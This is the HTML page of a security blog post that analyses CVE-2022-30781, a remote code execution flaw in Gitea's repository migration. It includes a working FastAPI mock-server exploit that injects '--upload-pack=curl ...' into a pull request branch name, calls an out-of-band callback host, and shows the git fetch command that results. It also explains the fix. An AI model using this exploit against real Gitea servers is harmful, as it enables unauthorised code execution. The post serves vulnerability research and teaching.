<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Analysis of CVE-2022â€“30781 | @MindPatch</title><meta name=keywords content="Gitea,RCE,git,research,cve"><meta name=description content="
How Git Fetch Resulted in Critical Remote Code Execution in Gitea

Good Morning, Everyone!
In todayâ€™s post, Iâ€™ll dive into an analysis of  CVE-2022â€“30781, a critical vulnerability found in the Gitea platform. This CVE allows attackers to execute remote code on the affected server, posing a significant security risk.
Hereâ€™s what weâ€™ll cover:

Understanding How the CVE Works
Writing Our Own Exploit
How the Gitea Team Fixed It

Letâ€™s jump in and enjoy"><meta name=author content="MindPatch"><link rel=canonical href=https://www.mindpatch.net/posts/2024-01-10-analysis-of-cve-202230781/><link crossorigin=anonymous href=/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css integrity="sha256-j+ECM6cGvIfy4Is8+XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as=style><link rel=icon href=https://www.mindpatch.net/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://www.mindpatch.net/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://www.mindpatch.net/favicon-32x32.png><link rel=apple-touch-icon href=https://www.mindpatch.net/apple-touch-icon.png><link rel=mask-icon href=https://www.mindpatch.net/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://www.mindpatch.net/posts/2024-01-10-analysis-of-cve-202230781/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:url" content="https://www.mindpatch.net/posts/2024-01-10-analysis-of-cve-202230781/"><meta property="og:site_name" content="@MindPatch"><meta property="og:title" content="Analysis of CVE-2022â€“30781"><meta property="og:description" content=" How Git Fetch Resulted in Critical Remote Code Execution in Gitea
Good Morning, Everyone!
In todayâ€™s post, Iâ€™ll dive into an analysis of CVE-2022â€“30781, a critical vulnerability found in the Gitea platform. This CVE allows attackers to execute remote code on the affected server, posing a significant security risk.
Hereâ€™s what weâ€™ll cover:
Understanding How the CVE Works Writing Our Own Exploit How the Gitea Team Fixed It Letâ€™s jump in and enjoy"><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-04-10T00:00:00+00:00"><meta property="article:modified_time" content="2025-04-10T00:00:00+00:00"><meta property="article:tag" content="Gitea"><meta property="article:tag" content="RCE"><meta property="article:tag" content="Git"><meta property="article:tag" content="Research"><meta property="article:tag" content="Cve"><meta property="og:image" content="https://www.mindpatch.net/og-image.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://www.mindpatch.net/og-image.png"><meta name=twitter:title content="Analysis of CVE-2022â€“30781"><meta name=twitter:description content="
How Git Fetch Resulted in Critical Remote Code Execution in Gitea

Good Morning, Everyone!
In todayâ€™s post, Iâ€™ll dive into an analysis of  CVE-2022â€“30781, a critical vulnerability found in the Gitea platform. This CVE allows attackers to execute remote code on the affected server, posing a significant security risk.
Hereâ€™s what weâ€™ll cover:

Understanding How the CVE Works
Writing Our Own Exploit
How the Gitea Team Fixed It

Letâ€™s jump in and enjoy"><meta name=twitter:site content="@https://twitter.com/mindpatch"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://www.mindpatch.net/posts/"},{"@type":"ListItem","position":2,"name":"Analysis of CVE-2022â€“30781","item":"https://www.mindpatch.net/posts/2024-01-10-analysis-of-cve-202230781/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Analysis of CVE-2022â€“30781","name":"Analysis of CVE-2022â€“30781","description":" How Git Fetch Resulted in Critical Remote Code Execution in Gitea\nGood Morning, Everyone!\nIn todayâ€™s post, Iâ€™ll dive into an analysis of CVE-2022â€“30781, a critical vulnerability found in the Gitea platform. This CVE allows attackers to execute remote code on the affected server, posing a significant security risk.\nHereâ€™s what weâ€™ll cover:\nUnderstanding How the CVE Works Writing Our Own Exploit How the Gitea Team Fixed It Letâ€™s jump in and enjoy\n","keywords":["Gitea","RCE","git","research","cve"],"articleBody":" How Git Fetch Resulted in Critical Remote Code Execution in Gitea\nGood Morning, Everyone!\nIn todayâ€™s post, Iâ€™ll dive into an analysis of CVE-2022â€“30781, a critical vulnerability found in the Gitea platform. This CVE allows attackers to execute remote code on the affected server, posing a significant security risk.\nHereâ€™s what weâ€™ll cover:\nUnderstanding How the CVE Works Writing Our Own Exploit How the Gitea Team Fixed It Letâ€™s jump in and enjoy\nImport your Git repo here in every git platform like gitea, it has a feature that allows you to import all your repo from another platform or different git server into your platform in single click which called Migration\nbut beside .git repo itâ€™s also provides some other options to\npull requests Wiki page issues and in order to extract these data gitea communicate with the chosen platform API in order to import this data\nand in one of these options is migrate a repo from another gitea server, and by choosing this option you can notice in logs a few requests from gitea for these endpoints\nand one of these endpoints returns the repo pull requests information including the pull request branch, and then gitea will fetch this branch using $ git fetch and as you can see, we cannot Espace using whitespace here in order to get that RCE\nFetch options The Fetch git subcommand has a few different options you can find here (Git â€” git-fetch Documentation)\nand the interesting one here is â€” upload-pack option\nâ€” upload-pack When given, and the repository to fetch from is handled by git fetch-pack, --exec= is passed to the command to specify non-default path for the command run on the other end.\nSo, Using this option lets us change the default path of the git-upload-pack tool. This can potentially lead to Remote Code Execution (RCE).\nTo exploit this, we could inject --upload-pack='CMD' into a branch name or a remote repository. However, Git itself doesnâ€™t allow this directly. ðŸ˜ž\nBut as mentioned earlier, Gitea servers use APIs to fetch repository information. So, we can set up a mock server to return fake data. When the server asks for the pull request branch, we can include the --upload-pack option in the response and check if it gets executed\nWriting The Exploit In writing the exploit process I always chose python as its the fastest and painless option for me, but you can pick what you like\nlets go write our exploit, and this one requires us first to see what gitea api client expect the response so we make sure it gets parsed right\nand this step can be done easily after analysing the gitea Swagger file, and after review it I came up with this simple API written in FastAPI\nfrom fastapi import APIRouter router = APIRouter(prefix=\"/api/v1\") RCE_PAYLOAD = \"curl ID.oast.fun\" # Mock data for some endpoints MAX_RESPONSE_ITEMS = 50 DEFAULT_PAGING_NUM = 30 DEFAULT_GIT_TREES_PER_PAGE = 1000 DEFAULT_MAX_BLOB_SIZE = 10485760 full_uri = \"http://localhost:3000/\" @router.get(\"/version\") async def get_version(): return {\"version\": \"1.16.6\"} @router.get(\"/settings/api\") async def get_settings(): return { \"max_response_items\": MAX_RESPONSE_ITEMS, \"default_paging_num\": DEFAULT_PAGING_NUM, \"default_git_trees_per_page\": DEFAULT_GIT_TREES_PER_PAGE, \"default_max_blob_size\": DEFAULT_MAX_BLOB_SIZE, } @router.get(\"/repos/{owner}/{repo}\") async def get_repo_info(owner: str, repo: str): \"\"\" Returns repository information for a given owner and repo. \"\"\" return { \"clone_url\": f\"{full_uri}{owner}/{repo}\", \"owner\": {\"login\": owner}, } @router.get(\"/repos/{owner}/{repo}/topics\") async def get_repo_topics(owner: str, repo: str): return {\"topics\": []} @router.get(\"/repos/{owner}/{repo}/pulls\") async def get_repo_pulls(owner: str, repo: str): \"\"\" Returns pull requests for a given repository. \"\"\" return [ { \"base\": {\"ref\": \"master\"}, \"head\": { \"ref\": f\"--upload-pack={RCE_PAYLOAD}\", \"repo\": { \"clone_url\": \"./\", \"owner\": {\"login\": \"master\"}, }, }, \"updated_at\": \"2001-01-01T05:00:00+01:00\", \"user\": {}, } ] As you can see in the pulls endpoint, I was able to inject the --upload-pack option into the ref, which corresponds to the pull requestâ€™s base branch.\nNow, letâ€™s test it. I ran the API, created a new migration in Gitea, and set the repository URL to myapi/test/test. Additionally, I enabled the option to fetch pull requests, ensuring that it pulls the repositoryâ€™s pull requests during the migration process\nAnd as you can See :)\nIn the background, the following command was executed:\n$ git fetch origin --upload-pack='curl '\nThis caused Gitea to make the specified curl request, demonstrating that the RCE was successfully exploited as a proof of concept (PoC)\nPatching the bug Gitea team fixed this bug by using --, which forces Git to treat everything following it as a plain string rather than a parsable option, This effectively resolves the issue.\nAnd thatâ€™s it! I hope you found this helpful.\nYou can access the testing lab and the exploit at:\nlatestpocs/CVE-2022â€“30781/gitea_poc at master Â· MindPatch/latestpocs\nTake care, and see you next time! ðŸ™‚\n","wordCount":"771","inLanguage":"en","image":"https://www.mindpatch.net/og-image.png","datePublished":"2025-04-10T00:00:00Z","dateModified":"2025-04-10T00:00:00Z","author":{"@type":"Person","name":"MindPatch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://www.mindpatch.net/posts/2024-01-10-analysis-of-cve-202230781/"},"publisher":{"@type":"Organization","name":"@MindPatch","logo":{"@type":"ImageObject","url":"https://www.mindpatch.net/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://www.mindpatch.net/ accesskey=h title="@MindPatch (Alt + H)">@MindPatch</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://www.mindpatch.net/about title=About><span>About</span></a></li><li><a href=https://www.mindpatch.net/projects/ title=Projects><span>Projects</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Analysis of CVE-2022â€“30781</h1><div class=post-meta><span title='2025-04-10 00:00:00 +0000 UTC'>April 10, 2025</span>&nbsp;Â·&nbsp;4 min&nbsp;Â·&nbsp;MindPatch</div></header><div class=post-content><hr><p>How Git Fetch Resulted in Critical Remote Code Execution in Gitea</p><p><img loading=lazy src=https://miro.medium.com/v2/resize:fit:477/0*7XgQCsp0nd9dRoQo.png></p><p><strong>Good Morning, Everyone!</strong></p><p>In todayâ€™s post, Iâ€™ll dive into an analysis of <strong>CVE-2022â€“30781</strong>, a critical vulnerability found in the Gitea platform. This CVE allows attackers to execute remote code on the affected server, posing a significant security risk.</p><p>Hereâ€™s what weâ€™ll cover:</p><ol><li><strong>Understanding How the CVE Works</strong></li><li><strong>Writing Our Own Exploit</strong></li><li><strong>How the Gitea Team Fixed It</strong></li></ol><p>Letâ€™s jump in and enjoy</p><h2 id=import-your-git-repo-here>Import your Git repo here<a hidden class=anchor aria-hidden=true href=#import-your-git-repo-here>#</a></h2><p>in every git platform like gitea, it has a feature that allows you to import all your repo from another platform or different git server into your platform in single click which called <strong>Migration</strong></p><p>but beside .git repo it&rsquo;s also provides some other options to</p><ul><li>pull requests</li><li>Wiki page</li><li>issues</li></ul><p><img loading=lazy src=https://miro.medium.com/v2/resize:fit:610/1*WbwcS7_bkRCKzFRpqfbAGQ.png></p><p>and in order to extract these data gitea communicate with the chosen platform API in order to import this data</p><p>and in one of these options is migrate a repo from another gitea server, and by choosing this option you can notice in logs a few requests from gitea for these endpoints</p><p><img loading=lazy src=https://miro.medium.com/v2/resize:fit:1000/1*L1GbLaJQJ5ci-rF6n69WCg.png></p><p>and one of these endpoints returns the repo pull requests information including the pull request branch, and then gitea will fetch this branch using <code>$ git fetch &lt;remote> &lt;branch></code></p><p><img loading=lazy src=https://miro.medium.com/v2/resize:fit:1000/1*_NpVmALCvNOrfyiALbmzUA.png></p><p>and as you can see, we cannot Espace using whitespace here in order to get that RCE</p><h2 id=fetch-options>Fetch options<a hidden class=anchor aria-hidden=true href=#fetch-options>#</a></h2><p>The Fetch git subcommand has a few different options you can find here (<a href=https://git-scm.com/docs/git-fetch>Git â€” git-fetch Documentation</a>)</p><p>and the interesting one here is <strong>â€” upload-pack</strong> option</p><blockquote><p>â€” upload-pack</p><p>When given, and the repository to fetch from is handled by <strong>git fetch-pack</strong>, <code>--exec=&lt;upload-pack></code> is passed to the command to specify non-default path for the command run on the other end.</p></blockquote><p>So, Using this option lets us change the default path of the <code>git-upload-pack</code> tool. This can potentially lead to Remote Code Execution (RCE).</p><p>To exploit this, we could inject <code>--upload-pack='CMD'</code> into a branch name or a remote repository. However, Git itself doesnâ€™t allow this directly. ðŸ˜ž</p><p>But as mentioned earlier, Gitea servers use APIs to fetch repository information. So, we can set up a mock server to return fake data. When the server asks for the pull request branch, we can include the <code>--upload-pack</code> option in the response and check if it gets executed</p><h2 id=writing-the-exploit>Writing The Exploit<a hidden class=anchor aria-hidden=true href=#writing-the-exploit>#</a></h2><p>In writing the exploit process I always chose python as its the fastest and painless option for me, but you can pick what you like</p><p>lets go write our exploit, and this one requires us first to see what gitea api client expect the response so we make sure it gets parsed right</p><p>and this step can be done easily after analysing the gitea Swagger file, and after review it I came up with this simple API written in FastAPI</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> fastapi <span style=color:#f92672>import</span> APIRouter  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>router <span style=color:#f92672>=</span> APIRouter(prefix<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/api/v1&#34;</span>)  
</span></span><span style=display:flex><span>RCE_PAYLOAD <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;curl ID.oast.fun&#34;</span>  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#75715e># Mock data for some endpoints  </span>
</span></span><span style=display:flex><span>MAX_RESPONSE_ITEMS <span style=color:#f92672>=</span> <span style=color:#ae81ff>50</span>  
</span></span><span style=display:flex><span>DEFAULT_PAGING_NUM <span style=color:#f92672>=</span> <span style=color:#ae81ff>30</span>  
</span></span><span style=display:flex><span>DEFAULT_GIT_TREES_PER_PAGE <span style=color:#f92672>=</span> <span style=color:#ae81ff>1000</span>  
</span></span><span style=display:flex><span>DEFAULT_MAX_BLOB_SIZE <span style=color:#f92672>=</span> <span style=color:#ae81ff>10485760</span>  
</span></span><span style=display:flex><span>full_uri <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://localhost:3000/&#34;</span>  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#a6e22e>@router.get</span>(<span style=color:#e6db74>&#34;/version&#34;</span>)  
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_version</span>():  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> {<span style=color:#e6db74>&#34;version&#34;</span>: <span style=color:#e6db74>&#34;1.16.6&#34;</span>}  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#a6e22e>@router.get</span>(<span style=color:#e6db74>&#34;/settings/api&#34;</span>)  
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_settings</span>():  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> {  
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;max_response_items&#34;</span>: MAX_RESPONSE_ITEMS,  
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;default_paging_num&#34;</span>: DEFAULT_PAGING_NUM,  
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;default_git_trees_per_page&#34;</span>: DEFAULT_GIT_TREES_PER_PAGE,  
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;default_max_blob_size&#34;</span>: DEFAULT_MAX_BLOB_SIZE,  
</span></span><span style=display:flex><span>    }  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#a6e22e>@router.get</span>(<span style=color:#e6db74>&#34;/repos/</span><span style=color:#e6db74>{owner}</span><span style=color:#e6db74>/</span><span style=color:#e6db74>{repo}</span><span style=color:#e6db74>&#34;</span>)  
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_repo_info</span>(owner: str, repo: str):  
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Returns repository information for a given owner and repo.  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> {  
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;clone_url&#34;</span>: <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>full_uri<span style=color:#e6db74>}{</span>owner<span style=color:#e6db74>}</span><span style=color:#e6db74>/</span><span style=color:#e6db74>{</span>repo<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>,  
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;owner&#34;</span>: {<span style=color:#e6db74>&#34;login&#34;</span>: owner},  
</span></span><span style=display:flex><span>    }  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#a6e22e>@router.get</span>(<span style=color:#e6db74>&#34;/repos/</span><span style=color:#e6db74>{owner}</span><span style=color:#e6db74>/</span><span style=color:#e6db74>{repo}</span><span style=color:#e6db74>/topics&#34;</span>)  
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_repo_topics</span>(owner: str, repo: str):  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> {<span style=color:#e6db74>&#34;topics&#34;</span>: []}  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#a6e22e>@router.get</span>(<span style=color:#e6db74>&#34;/repos/</span><span style=color:#e6db74>{owner}</span><span style=color:#e6db74>/</span><span style=color:#e6db74>{repo}</span><span style=color:#e6db74>/pulls&#34;</span>)  
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_repo_pulls</span>(owner: str, repo: str):  
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Returns pull requests for a given repository.  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> [  
</span></span><span style=display:flex><span>        {  
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;base&#34;</span>: {<span style=color:#e6db74>&#34;ref&#34;</span>: <span style=color:#e6db74>&#34;master&#34;</span>},  
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;head&#34;</span>: {  
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;ref&#34;</span>: <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;--upload-pack=</span><span style=color:#e6db74>{</span>RCE_PAYLOAD<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>,  
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;repo&#34;</span>: {  
</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;clone_url&#34;</span>: <span style=color:#e6db74>&#34;./&#34;</span>,  
</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;owner&#34;</span>: {<span style=color:#e6db74>&#34;login&#34;</span>: <span style=color:#e6db74>&#34;master&#34;</span>},  
</span></span><span style=display:flex><span>                },  
</span></span><span style=display:flex><span>            },  
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;updated_at&#34;</span>: <span style=color:#e6db74>&#34;2001-01-01T05:00:00+01:00&#34;</span>,  
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;user&#34;</span>: {},  
</span></span><span style=display:flex><span>        }  
</span></span><span style=display:flex><span>    ]
</span></span></code></pre></div><p>As you can see in the pulls endpoint, I was able to inject the <code>--upload-pack</code> option into the <code>ref</code>, which corresponds to the pull request&rsquo;s base branch.</p><p>Now, letâ€™s test it. I ran the API, created a new migration in Gitea, and set the repository URL to <code>myapi/test/test</code>. Additionally, I enabled the option to fetch pull requests, ensuring that it pulls the repository&rsquo;s pull requests during the migration process</p><p>And as you can See :)</p><p><a href="https://www.youtube.com/watch?v=9KOjRB9IKSo"><img alt="VIDEO POC" loading=lazy src=https://img.youtube.com/vi/9KOjRB9IKSo/0.jpg></a></p><p>In the background, the following command was executed:<br><code>$ git fetch origin --upload-pack='curl &lt;host>'</code></p><p>This caused Gitea to make the specified <code>curl</code> request, demonstrating that the RCE was successfully exploited as a proof of concept (PoC)</p><h2 id=patching-the-bug>Patching the bug<a hidden class=anchor aria-hidden=true href=#patching-the-bug>#</a></h2><p>Gitea team fixed this bug by using <code>--</code>, which forces Git to treat everything following it as a plain string rather than a parsable option, This effectively resolves the issue.</p><p><img loading=lazy src=https://miro.medium.com/v2/resize:fit:1000/1*lreFlMwsoRz_970hBC3siA.png></p><p>And thatâ€™s it! I hope you found this helpful.</p><p>You can access the testing lab and the exploit at:<br><a href=https://github.com/MindPatch/latestpocs>latestpocs/CVE-2022â€“30781/gitea_poc at master Â· MindPatch/latestpocs</a></p><p>Take care, and see you next time! ðŸ™‚</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://www.mindpatch.net/tags/gitea/>Gitea</a></li><li><a href=https://www.mindpatch.net/tags/rce/>RCE</a></li><li><a href=https://www.mindpatch.net/tags/git/>Git</a></li><li><a href=https://www.mindpatch.net/tags/research/>Research</a></li><li><a href=https://www.mindpatch.net/tags/cve/>Cve</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://www.mindpatch.net/>@MindPatch</a></span> Â·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>